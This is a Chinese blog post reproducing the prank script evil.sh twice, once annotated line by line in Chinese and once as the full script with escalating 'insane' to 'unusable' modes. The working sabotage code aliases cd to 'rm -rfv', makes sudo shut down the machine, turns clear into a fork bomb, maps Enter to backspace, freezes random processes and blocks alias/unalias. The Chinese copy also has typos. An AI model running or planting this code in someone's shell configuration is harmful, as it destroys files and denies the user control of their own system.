---
title: Oh my God
date: Mon Jul 10 13:40:18 CST 2017
---

Oh My God
=========

Oh My God's shell
-----------------

> 不要轻易尝试，一切自负。
> 原文链接：[https://linux.cn](https://linux.cn/article-8544-1.html)

```bash
export EDITOR=/bin/rm;
tset -Qe $'\t';
# tset 设置终端特征；-e 设置擦除字符，缺省为退格字符；-Q 不显示设置信息(静默)。
((RANDOM % 10)) || set -o errexit;
# set -o errexit = set -e, 表示有任何错误(命令的返回状态非 0)时即退出。
alias cat=true; true 命令什么也不干，它只是返回一个 `0` 的状态码。
function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
# ls 的 f 选项表示不排序输出（即只按照磁盘存储顺序输出）；r 表示反向排序；S 表示按文件大小排序；t 表示按修改时间排序；u 表示按最后访问时间排序。
alias cd='rm -rfv';
# rm 命令的 -r 表示可删除（非空）目录；-f 表示不需要确认删除；-v 表示删除后显示被删除的文件/目录名称
alias sudo='sudo shutdown -P now';
# shutdown 命令用来关闭系统，-P 参数表示连同电源一起关闭； now 表示马上关机。这之后的参数（在此例中，是原本希望 sudo 执行的命令）会作为关闭前的通知信息，广播给系统上所有在线的用户。
alias clear=':(){ :|:& };:';
# fork 炸弹, DoS(Denial of Service)。
alias date='date -d "now + $RANDOM days"';
# date 命令可以显示相对偏移的日期，上述命令中 $RANDOM 的结果是一个随机的整数，也就是说这里的 date 命令会返回若干天之后的日期。
#---------------------------------------------------------------------------
N=$[$RANDOM % 3];
if [[ $N == 0 ]]; then
    # 几分钟后随即打开或关闭
    sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
elif [[ $N == 1 ]]; then
    # 要么，死活打不开
    sh -c 'while :; do eject -t; eject -i on; sleep 0.1s; done' > /dev/null 2>&1 &
else
    # 要么，读取变得极慢（1 倍速），需要循环的原因是弹出后就需要重新设定。
    sh -c 'set +o errexit; while :; do eject -x 1; sleep 1s; done' > /dev/null 2>&1 &
fi;
# eject 是操作 CD 驱动器的命令行，记得当年有位第一次接触 SUN Solaris 的同事问我，这 CD 怎么打开啊？我默默地输入了 eject， 在同事愕然的眼光中不带走一丝云彩轻轻地离开。
# eject 的 -T 选项会将关闭的 CD 驱动器打开，将打开的 CD 驱动器关闭；-t 选项则是关闭 CD 驱动器；-x 选项用来设置读取倍速；-i on 用于将弹出按钮失效。
#---------------------------------------------------------------------------
sleep $[ ( $RANDOM % 100 )  + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
# sleep, 代表暂停若干秒。通过上述 ps 命令会会随机选出（sort 命令的 -R 选项）一个你的进程号，
# 然后由 kill 命令发送 STOP 信号给它。STOP 信息会使程序被停止（冻结、挂起），
# 在命令行中可有 CTRL-Z 发出，被停止的进程可以通过 bg 放到后台运行，也可以由 fg 带回到前台。
alias cp='mv';
alias exit='sh';
function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }
# grep 的你，应该知道 -n 参数可以告诉你所匹配的行的行号
# grep 命令的 -n 用于输出匹配的行的行号，上述函数将 grep 定义为一个输出的行号完全不可预测的程序。
alias if='if !' for='for !' while='whlie !';
# if 、for 和 while 是用于 shell 脚本中做逻辑判断和循环的语句，! 表示对表达式逻辑取反。
bind '"\C-J":"\C-?"';
bind '"\C-M":"\C-?"';
# bind 用于显示和设置键盘序列绑定，C-J 代表 CTRL-J，所触发的 ASCII 码是 0x0A，即“换行”；
# C-M 代表 CTRL-M，所触发的 ASCII 码是 0x0D，即“回车”；C-? 代表 CTRL-?，所触发的 ASCII
# 码是 0x7F，即“退格”。也就是说，你按下的回车键，会被映射为退格键。关于 ASCII 控制字符，
# 可参见： http://ascii-table.com/control-chars.php 。也可以使用 showkey -a 命令来检验你
# 按下的键的键值（CTRL-D 退出）。
alias yes="yes n";
# yes 命令常用于脚本中应答 y，但是这里重定义了 yes 的结果。
alias vim="vim +q";
# vim 可以用 + 来跟上要在 vim 里面执行的命令，这里 +q 表示退出 vim。
alias unalias=false;
alias alias=false;
# 将 alias 和 unalias 别名为 false，那你就不能执行 alias 的功能了。

```
调用命令时，尽量用 `\命令`，和全路径。只是一般人不会这么用。
evil.sh
```bash
#!/usr/bin/env bash
# evil.sh — https://mths.be/evil.sh

# valid values are: insane, annoying, destructive, devasting, unusable
# each mode of operation includes the previous one's tweaks
#
# insane: only enable subtle behaviour that confuses and slowly drives people insane e.g. make exit
#   open a new shell
# annoying: like insane just way more obvious behaviour allowed (e.g. constantly cd to the wrong
#   (random) directory
# destructive: delete files and do serious harm, non-recoverable damage included
# devasting: may delete /
# unusable: enable everything including, but not limited to replacing enter by backspace
EVIL_BEHAVIOUR=annoying

function insane()
{
	annoying || test "$EVIL_BEHAVIOUR" = "insane"
}

function annoying()
{
	destructive || test "$EVIL_BEHAVIOUR" = "annoying"
}

function destructive()
{
	devasting || test "$EVIL_BEHAVIOUR" = "destructive"
}

function devasting()
{
	unusable || test "$EVIL_BEHAVIOUR" = "devasting"
}

function unusable()
{
	test "$EVIL_BEHAVIOUR" = "unusable"
}

# Set `rm` as the default editor.
destructive && export EDITOR=/bin/rm;

# Make Tab send the delete key.
insane && tset -Qe $'\t';

# Randomly make the shell exit whenever a command has a non-zero exit status.
if insane
then
	((RANDOM % 10)) || set -o errexit;
fi

# Let `cat` swallow every input and never return anything.
annoying && alias cat=true;

# Use a random sort option whenever `ls` is invoked.
annoying && function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }

# Delete directories instead of entering them.
devasting && alias cd='rm -rfv';

# Shut down the computer instead of running a command with super-user rights.
destructive && alias sudo='sudo shutdown -P now';

# Launch a fork bomb instead of clearing the screen.
destructive && alias clear=':(){ :|:& };:';

# Have `date` return random dates.
annoying && alias date='date -d "now + $RANDOM days"';

# Sometimes, wait a few minutes and then start randomly ejecting the CD drive.
# Other times, resist all attempts at opening it. Other times, make it read
# reaaaalllly sllooowwwwllly.
annoying && if [ "$(uname)" = 'Darwin' ]; then
	# Much less fun on Macs, alas.
	if [[ $[$RANDOM % 2] == 0 ]]; then
		# Eject!
		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do drutil eject; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
	else
		# Lock! Admittedly, much less annoying on most Macs,	which don’t support
		# locking and are slot-loading anyway.
		sh -c 'while :; do drutil tray close; sleep 0.1s; done' > /dev/null 2>&1 &
	fi;
else
	N=$[$RANDOM % 3];
	if [[ $N == 0 ]]; then
		# Open and close randomly after a few minutes.
		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
	elif [[ $N == 1 ]]; then
		# Lock, and keep closing just in case.
		sh -c 'while :; do eject -t; eject -i on; sleep 0.1s; done' > /dev/null 2>&1 &
	else
		# Slowness (1× CD speed). This has to be in a loop because it resets with
		# every ejection.
		sh -c 'set +o errexit; while :; do eject -x 1; sleep 1s; done' > /dev/null 2>&1 &
	fi;
fi;

# Send STOP signal to random process at random time.
destructive && sleep $[ ( $RANDOM % 100 ) + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &

# Have `cp` perform `mv` instead.
destructive && alias cp='mv';

# Make `exit` open a new shell.
annoying && alias exit='sh';

# Add a random number to line numbers when using `grep -n`.
insane && function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }

# Invert `if`, `for`, and `while`.
annoying && alias if='if !' for='for !' while='while !';

# Map Enter, Ctrl+J, and Ctrl+M to backspace.
unusable && bind '"\C-J":"\C-?"';
unusable && bind '"\C-M":"\C-?"';

# Send `n` (no) instead of `y` (yes)
annoying && alias yes="yes n";

# Quit vim on startup.
annoying && alias vim="vim +q";

# Disable `unalias` and `alias`.
alias unalias=false;
alias alias=false;
```
